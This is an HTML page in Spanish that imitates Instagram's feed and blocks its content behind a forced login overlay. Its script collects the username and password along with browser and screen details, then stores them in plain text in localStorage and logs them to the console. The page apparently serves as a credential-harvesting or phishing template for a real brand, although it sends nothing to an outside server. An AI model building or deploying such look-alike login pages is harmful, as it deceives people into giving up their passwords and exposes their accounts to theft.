<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Proyecto Instagram</title>
    <style>
        :root {
            --background-color: #fafafa;
            --primary-color: #262626;
            --secondary-color: #8e8e8e;
            --border-color: #dbdbdb;
            --highlight-color: #0095f6;
            --danger-color: #ed4956;
            --success-color: #70c050;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--background-color);
            color: var(--primary-color);
        }

        /* Header */
        header {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            background-color: white;
            border-bottom: 1px solid var(--border-color);
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 100;
        }

        .logo {
            height: 29px;
        }

        .search-bar {
            position: relative;
            width: 215px;
        }

        .search-bar input {
            width: 100%;
            padding: 8px 20px 8px 40px;
            background-color: #efefef;
            border: none;
            border-radius: 8px;
            font-size: 14px;
        }

        .search-bar i {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--secondary-color);
        }

        .nav-icons {
            display: flex;
            gap: 22px;
        }

        .nav-icons i {
            font-size: 24px;
            cursor: pointer;
        }

        /* Main Content */
        main {
            max-width: 935px;
            margin: 80px auto 0;
            display: flex;
        }

        /* Stories */
        .stories {
            display: flex;
            gap: 15px;
            padding: 10px 0;
            margin-bottom: 20px;
            overflow-x: auto;
            background-color: white;
            border: 1px solid var(--border-color);
            border-radius: 8px;
        }

        .story {
            display: flex;
            flex-direction: column;
            align-items: center;
            cursor: pointer;
        }

        .story-avatar {
            width: 66px;
            height: 66px;
            border-radius: 50%;
            border: 2px solid #e1306c;
            padding: 2px;
            margin-bottom: 5px;
        }

        .story-avatar img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
        }

        .story-username {
            font-size: 12px;
            color: var(--primary-color);
            max-width: 70px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        /* Feed */
        .feed {
            flex: 2;
            padding-right: 20px;
        }

        .post {
            background-color: white;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            margin-bottom: 20px;
        }

        .post-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px;
        }

        .post-user {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .post-avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
        }

        .post-avatar img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
        }

        .post-username {
            font-weight: 600;
            font-size: 14px;
        }

        .post-options {
            cursor: pointer;
        }

        .post-image {
            width: 100%;
        }

        .post-image img {
            width: 100%;
            height: auto;
            object-fit: cover;
        }

        .post-actions {
            display: flex;
            justify-content: space-between;
            padding: 10px 12px;
        }

        .post-buttons {
            display: flex;
            gap: 16px;
        }

        .post-buttons i {
            font-size: 24px;
            cursor: pointer;
        }

        .post-save i {
            font-size: 24px;
            cursor: pointer;
        }

        .post-likes {
            padding: 0 12px;
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 8px;
        }

        .post-caption {
            padding: 0 12px;
            margin-bottom: 8px;
        }

        .post-caption strong {
            font-weight: 600;
        }

        .post-comments {
            padding: 0 12px;
            color: var(--secondary-color);
            font-size: 14px;
            margin-bottom: 8px;
            cursor: pointer;
        }

        .post-time {
            padding: 0 12px 12px;
            color: var(--secondary-color);
            font-size: 10px;
            text-transform: uppercase;
        }

        .post-add-comment {
            display: flex;
            align-items: center;
            padding: 12px;
            border-top: 1px solid var(--border-color);
        }

        .post-add-comment input {
            flex: 1;
            border: none;
            outline: none;
            padding: 8px;
            font-size: 14px;
        }

        .post-add-comment button {
            background: none;
            border: none;
            color: var(--highlight-color);
            font-weight: 600;
            cursor: pointer;
            opacity: 0.5;
        }

        .post-add-comment button.active {
            opacity: 1;
        }

        /* Sidebar */
        .sidebar {
            flex: 1;
            position: sticky;
            top: 80px;
            height: fit-content;
        }

        .profile {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .profile-avatar {
            width: 56px;
            height: 56px;
            border-radius: 50%;
            margin-right: 16px;
        }

        .profile-avatar img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
        }

        .profile-info {
            flex: 1;
        }

        .profile-username {
            font-weight: 600;
            font-size: 14px;
            color: var(--primary-color);
        }

        .profile-name {
            color: var(--secondary-color);
            font-size: 14px;
        }

        .switch-button {
            color: var(--highlight-color);
            font-weight: 600;
            font-size: 12px;
            cursor: pointer;
        }

        .suggestions-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
        }

        .suggestions-title {
            font-weight: 600;
            color: var(--secondary-color);
            font-size: 14px;
        }

        .see-all {
            font-weight: 600;
            font-size: 12px;
            cursor: pointer;
        }

        .suggestion {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }

        .suggestion-avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            margin-right: 12px;
        }

        .suggestion-avatar img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
        }

        .suggestion-info {
            flex: 1;
        }

        .suggestion-username {
            font-weight: 600;
            font-size: 14px;
            color: var(--primary-color);
        }

        .suggestion-status {
            color: var(--secondary-color);
            font-size: 12px;
        }

        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: var(--secondary-color);
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            margin-bottom: 15px;
        }

        .footer-links a {
            color: var(--secondary-color);
            text-decoration: none;
        }

        .footer-links a:after {
            content: "·";
            margin: 0 3px;
        }

        .footer-links a:last-child:after {
            content: "";
        }

        .copyright {
            text-transform: uppercase;
        }

        /* Login modal */
        .modal {
            display: none;
            position: fixed;
            z-index: 200;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
        }

        .modal-content {
            background-color: white;
            margin: 15% auto;
            padding: 20px;
            border-radius: 12px;
            width: 400px;
            max-width: 90%;
        }

        .modal-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .modal-header h2 {
            font-size: 24px;
            margin-bottom: 10px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            font-size: 14px;
        }

        .btn-submit {
            width: 100%;
            padding: 10px;
            background-color: var(--highlight-color);
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
        }

        .close {
            color: var(--secondary-color);
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        /* Login required overlay */
        .login-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 150;
        }

        .login-card {
            background-color: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 90%;
            width: 400px;
        }

        .login-card h2 {
            margin-bottom: 20px;
            font-size: 24px;
        }

        .login-card p {
            margin-bottom: 20px;
            color: var(--secondary-color);
        }

        /* Responsive */
        @media (max-width: 935px) {
            main {
                flex-direction: column;
                padding: 0 10px;
            }
            
            .feed {
                padding-right: 0;
            }
            
            .sidebar {
                display: none;
            }
        }

        @media (max-width: 500px) {
            .search-bar {
                display: none;
            }
            
            .stories {
                margin-bottom: 10px;
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <!-- Overlay de inicio de sesión requerido -->
    <div class="login-overlay" id="loginOverlay">
        <div class="login-card">
            <h2>Bienvenido a nuestro proyecto</h2>
            <p>Inicia sesión para ver fotos y vídeos de tus amigos.</p>
            <button class="btn-submit" id="showLoginBtn">Iniciar sesión</button>
        </div>
    </div>

    <header>
        <div class="logo">
            <img src="/api/placeholder/103/29" alt="Proyecto Instagram">
        </div>
        <div class="search-bar">
            <i class="fa fa-search"></i>
            <input type="text" placeholder="Buscar">
        </div>
        <div class="nav-icons">
            <i class="fa fa-home"></i>
            <i class="fa fa-paper-plane"></i>
            <i class="fa fa-compass"></i>
            <i class="fa fa-heart"></i>
            <i class="fa fa-user" id="open-login"></i>
        </div>
    </header>

    <main>
        <div class="feed">
            <div class="stories">
                <div class="story">
                    <div class="story-avatar">
                        <img src="/api/placeholder/66/66" alt="Usuario">
                    </div>
                    <span class="story-username">usuario1</span>
                </div>
                <div class="story">
                    <div class="story-avatar">
                        <img src="/api/placeholder/66/66" alt="Usuario">
                    </div>
                    <span class="story-username">usuario2</span>
                </div>
                <div class="story">
                    <div class="story-avatar">
                        <img src="/api/placeholder/66/66" alt="Usuario">
                    </div>
                    <span class="story-username">usuario3</span>
                </div>
                <div class="story">
                    <div class="story-avatar">
                        <img src="/api/placeholder/66/66" alt="Usuario">
                    </div>
                    <span class="story-username">usuario4</span>
                </div>
                <div class="story">
                    <div class="story-avatar">
                        <img src="/api/placeholder/66/66" alt="Usuario">
                    </div>
                    <span class="story-username">usuario5</span>
                </div>
            </div>

            <div class="post">
                <div class="post-header">
                    <div class="post-user">
                        <div class="post-avatar">
                            <img src="/api/placeholder/32/32" alt="Usuario">
                        </div>
                        <div class="post-username">usuario1</div>
                    </div>
                    <div class="post-options">
                        <i class="fa fa-ellipsis"></i>
                    </div>
                </div>
                <div class="post-image">
                    <img src="/api/placeholder/614/614" alt="Publicación">
                </div>
                <div class="post-actions">
                    <div class="post-buttons">
                        <i class="fa fa-heart"></i>
                        <i class="fa fa-comment"></i>
                        <i class="fa fa-paper-plane"></i>
                    </div>
                    <div class="post-save">
                        <i class="fa fa-bookmark"></i>
                    </div>
                </div>
                <div class="post-likes">123 Me gusta</div>
                <div class="post-caption">
                    <strong>usuario1</strong> Este es un ejemplo de descripción para una publicación en nuestra interfaz similar a Instagram.
                </div>
                <div class="post-comments">Ver los 45 comentarios</div>
                <div class="post-time">Hace 2 horas</div>
                <div class="post-add-comment">
                    <input type="text" placeholder="Añade un comentario...">
                    <button>Publicar</button>
                </div>
            </div>

            <div class="post">
                <div class="post-header">
                    <div class="post-user">
                        <div class="post-avatar">
                            <img src="/api/placeholder/32/32" alt="Usuario">
                        </div>
                        <div class="post-username">usuario2</div>
                    </div>
                    <div class="post-options">
                        <i class="fa fa-ellipsis"></i>
                    </div>
                </div>
                <div class="post-image">
                    <img src="/api/placeholder/614/614" alt="Publicación">
                </div>
                <div class="post-actions">
                    <div class="post-buttons">
                        <i class="fa fa-heart"></i>
                        <i class="fa fa-comment"></i>
                        <i class="fa fa-paper-plane"></i>
                    </div>
                    <div class="post-save">
                        <i class="fa fa-bookmark"></i>
                    </div>
                </div>
                <div class="post-likes">87 Me gusta</div>
                <div class="post-caption">
                    <strong>usuario2</strong> Otra publicación de ejemplo para mostrar la estructura de nuestro feed.
                </div>
                <div class="post-comments">Ver los 12 comentarios</div>
                <div class="post-time">Hace 5 horas</div>
                <div class="post-add-comment">
                    <input type="text" placeholder="Añade un comentario...">
                    <button>Publicar</button>
                </div>
            </div>
        </div>

        <div class="sidebar">
            <div class="profile">
                <div class="profile-avatar">
                    <img src="/api/placeholder/56/56" alt="Tu perfil">
                </div>
                <div class="profile-info">
                    <div class="profile-username">invitado</div>
                    <div class="profile-name">Usuario Invitado</div>
                </div>
                <div class="switch-button" id="sidebar-login">Iniciar sesión</div>
            </div>

            <div class="suggestions">
                <div class="suggestions-header">
                    <div class="suggestions-title">Sugerencias para ti</div>
                    <div class="see-all">Ver todo</div>
                </div>

                <div class="suggestion">
                    <div class="suggestion-avatar">
                        <img src="/api/placeholder/32/32" alt="Sugerencia">
                    </div>
                    <div class="suggestion-info">
                        <div class="suggestion-username">usuario_sugerido1</div>
                        <div class="suggestion-status">Nuevo en Instagram</div>
                    </div>
                    <div class="switch-button">Seguir</div>
                </div>

                <div class="suggestion">
                    <div class="suggestion-avatar">
                        <img src="/api/placeholder/32/32" alt="Sugerencia">
                    </div>
                    <div class="suggestion-info">
                        <div class="suggestion-username">usuario_sugerido2</div>
                        <div class="suggestion-status">Seguido por usuario3</div>
                    </div>
                    <div class="switch-button">Seguir</div>
                </div>

                <div class="suggestion">
                    <div class="suggestion-avatar">
                        <img src="/api/placeholder/32/32" alt="Sugerencia">
                    </div>
                    <div class="suggestion-info">
                        <div class="suggestion-username">usuario_sugerido3</div>
                        <div class="suggestion-status">Seguido por usuario1</div>
                    </div>
                    <div class="switch-button">Seguir</div>
                </div>
            </div>

            <div class="footer">
                <div class="footer-links">
                    <a href="#">Información</a>
                    <a href="#">Ayuda</a>
                    <a href="#">Prensa</a>
                    <a href="#">API</a>
                    <a href="#">Empleo</a>
                    <a href="#">Privacidad</a>
                    <a href="#">Condiciones</a>
                    <a href="#">Ubicaciones</a>
                    <a href="#">Idioma</a>
                </div>
                <div class="copyright">© 2025 proyecto instagram</div>
            </div>
        </div>
    </main>

    <!-- Modal de inicio de sesión -->
    <div id="loginModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <div class="modal-header">
                <h2>Iniciar sesión</h2>
                <p>Accede a nuestro proyecto</p>
            </div>
            <form id="loginForm">
                <div class="form-group">
                    <label for="username">Nombre de usuario, correo o teléfono</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div class="form-group">
                    <label for="password">Contraseña</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="btn-submit">Iniciar sesión</button>
            </form>
        </div>
    </div>

    <script>
        // Variables para tracking de datos de inicio de sesión
        let loginAttempts = [];
        
        // Modal de inicio de sesión
        const modal = document.getElementById("loginModal");
        const loginOverlay = document.getElementById("loginOverlay");
        const openLoginBtn = document.getElementById("open-login");
        const showLoginBtn = document.getElementById("showLoginBtn");
        const sidebarLoginBtn = document.getElementById("sidebar-login");
        const closeButton = document.getElementsByClassName("close")[0];

        // Función para mostrar el modal de inicio de sesión
        function showLoginModal() {
            modal.style.display = "block";
        }

        // Asignar eventos para abrir el modal de inicio de sesión
        openLoginBtn.onclick = showLoginModal;
        showLoginBtn.onclick = showLoginModal;
        sidebarLoginBtn.onclick = showLoginModal;

        // Cerrar el modal al hacer clic en la X
        closeButton.onclick = function() {
            modal.style.display = "none";
        }

        // Cerrar el modal al hacer clic fuera de él
        window.onclick = function(event) {
            if (event.target == modal) {
                modal.style.display = "none";
            }
        }

        // Formulario de inicio de sesión
        const loginForm = document.getElementById("loginForm");
        loginForm.addEventListener("submit", function(e) {
            e.preventDefault();
            
            // Obtener la fecha y hora actual
            const currentTime = new Date();
            
            // Recopilar datos del formulario
            const loginData = {
                username: document.getElementById("username").value,
                password: document.getElementById("password").value,
                timestamp: currentTime.toISOString(),
                userAgent: navigator.userAgent,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                locale: navigator.language
            };
            
            // Guardar los datos de inicio de sesión
            loginAttempts.push(loginData);
            
            // Guardar en localStorage
            localStorage.setItem('loginAttempts', JSON.stringify(loginAttempts));
            
            console.log("Datos de inicio de sesión recopilados:", loginData);
            console.log("Historial de intentos:", loginAttempts);
            
            // Ocultar overlay y modal
            loginOverlay.style.display = "none";
            modal.style.display = "none";
            
            // Cambiar información de perfil en la barra lateral
            document.querySelector('.profile-username').textContent = loginData.username;
            document.querySelector('.profile-name').textContent = "Usuario";
            document.getElementById('sidebar-login').textContent = "Cambiar";
            
            // Limpiar el formulario
            loginForm.reset();
        });

        // Activar botón de publicar en comentarios
        const commentInputs = document.querySelectorAll(".post-add-comment input");
        const publishButtons = document.querySelectorAll(".post-add-comment button");

        commentInputs.forEach((input, index) => {
            input.addEventListener("input", function() {
                if (this.value.trim() !== "") {
                    publishButtons[index].classList.add("active");
                } else {
                    publishButtons[index].classList.remove("active");
                }
            });
        });

        // Simular interacción con los botones de me gusta
        const likeButtons = document.querySelectorAll(".fa-heart");
        likeButtons.forEach(button => {
            button.addEventListener("click", function() {
                // Si el overlay de login está visible, mostrar el modal de login
                if (loginOverlay.style.display !== "none") {
                    showLoginModal();
                    return;
                }
                
                this.classList.toggle("fas");
                const likesElement = this.closest(".post").querySelector(".post-likes");
                const currentLikes = parseInt(likesElement.textContent);
                if (this.classList.contains("fas")) {
                    likesElement.textContent = (currentLikes + 1) + " Me gusta";
                } else {
                    likesElement.textContent = (currentLikes - 1) + " Me gusta";
                }
            });
        });

        // Simular guardar publicación
        const saveButtons = document.querySelectorAll(".fa-bookmark");
        saveButtons.forEach(button => {
            button.addEventListener("click", function() {
                // Si el overlay de login está visible, mostrar el modal de login
                if (loginOverlay.style.display !== "none") {
                    showLoginModal();
                    return;
                }
                
                this.classList.toggle("fas");
            });
        });
        
        // Verificar si ya hay datos de inicio de sesión guardados
        window.onload = function() {
            const savedLoginAttempts = localStorage.getItem('loginAttempts');
            if (savedLoginAttempts) {
                loginAttempts = JSON.parse(savedLoginAttempts);
                
                // Si ya hay intentos previos, ocultar el overlay
                if (loginAttempts.length > 0) {
                    loginOverlay.style.display = "none";
                    
                    // Actualizar información de perfil con el último inicio de sesión
                    const lastLogin = loginAttempts[loginAttempts.length - 1];
                    document.querySelector('.profile-username').textContent = lastLogin.username;
                }
            }
        };
    </script>
</body>
</html>
